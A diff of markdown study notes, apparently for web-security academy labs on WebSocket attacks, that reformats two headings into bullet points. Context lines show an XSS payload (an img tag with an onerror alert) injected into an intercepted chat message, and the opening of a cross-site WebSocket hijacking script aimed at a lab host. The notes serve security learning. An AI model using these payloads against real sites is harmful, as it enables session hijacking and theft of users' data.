@@ -3,8 +3,8 @@
 - To exploit, interecpt the live chat message and change it to: `<img src=1 onerror='alert(1)'>`
 
 # Cross-site web socket hijacking
-## Occurs when only the session token is used in the handshake
-## This is the exploit:
+- Occurs when only the session token is used in the handshake
+- This is the exploit:
 ```html
 <script>
     var ws = new WebSocket('wss://0a97007904d6e29880c2bccb00cd0079.web-security-academy.net/chat');
